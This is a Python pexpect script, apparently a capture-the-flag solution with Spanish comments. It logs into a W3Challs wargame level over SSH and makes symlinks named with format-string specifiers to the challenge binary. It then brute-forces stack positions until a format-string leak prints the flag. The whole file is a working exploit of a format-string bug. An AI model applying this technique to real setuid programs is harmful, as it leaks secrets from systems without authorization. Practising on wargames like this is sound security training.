#!/usr/bin/env python3

import pexpect
import time

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

child.sendline(b"cd /tmp && rm -f fs* 2>/dev/null")
child.expect([b'\\$'])

print("\n[*] Búsqueda exhaustiva de la flag...")

found = False

# Buscar en un rango muy amplio
for i in range(1, 300):
    if i % 50 == 0:
        print(f"  Probadas {i} posiciones...")
    
    # Crear symlink con %i$s
    name = f'fs{i}'.encode()
    format_str = f'%{i}$s'.encode()
    
    cmd = b'ln -sf /home/basic9/basic9 \'' + format_str + b'\' 2>/dev/null'
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=0.5)
    
    # Ejecutar
    cmd = b'./\'' + format_str + b'\' x 2>&1 | head -10'
    child.sendline(cmd)
    
    # Buscar W3C rápidamente
    try:
        index = child.expect([b'\\$', b'W3C'], timeout=0.5)
        
        if index == 1:
            # Encontrado!
            print(f"\n🔥 ENCONTRADO EN POSICIÓN {i} 🔥")
            
            # Obtener más output
            child.expect([b'\\$'], timeout=2)
            output = child.before + (child.after if child.after else b'')
            
            # Decodificar
            try:
                output_str = output.decode('utf-8', errors='ignore')
            except:
                output_str = output.decode('latin-1', errors='ignore')
            
            # Buscar la flag completa
            import re
            match = re.search(r'W3C\{[^\}]*\}', output_str)
            if match:
                print(f"\n🔥🔥🔥 FLAG: {match.group(0)} 🔥🔥🔥\n")
                found = True
                break
            else:
                # Si no encuentra completa, mostrar lo que hay
                print(f"Output: {output_str[:200]}")
                
                # Intentar obtener más
                cmd = b'./\'' + format_str + b'\' x 2>&1 | strings | grep W3C'
                child.sendline(cmd)
                child.expect([b'\\$'], timeout=2)
                extra = child.before
                
                if b'W3C{' in extra:
                    try:
                        extra_str = extra.decode('utf-8', errors='ignore')
                        match = re.search(r'W3C\{[^\}]*\}', extra_str)
                        if match:
                            print(f"\n🔥🔥🔥 FLAG: {match.group(0)} 🔥🔥🔥\n")
                            found = True
                            break
                    except:
                        pass
    except pexpect.TIMEOUT:
        pass
    except:
        pass

if not found:
    print("\n[!] No se encontró en posiciones 1-300")
    print("[*] La flag puede estar en una posición > 300 o necesitar otro approach")

child.close()
print("\n💀 FIN 💀")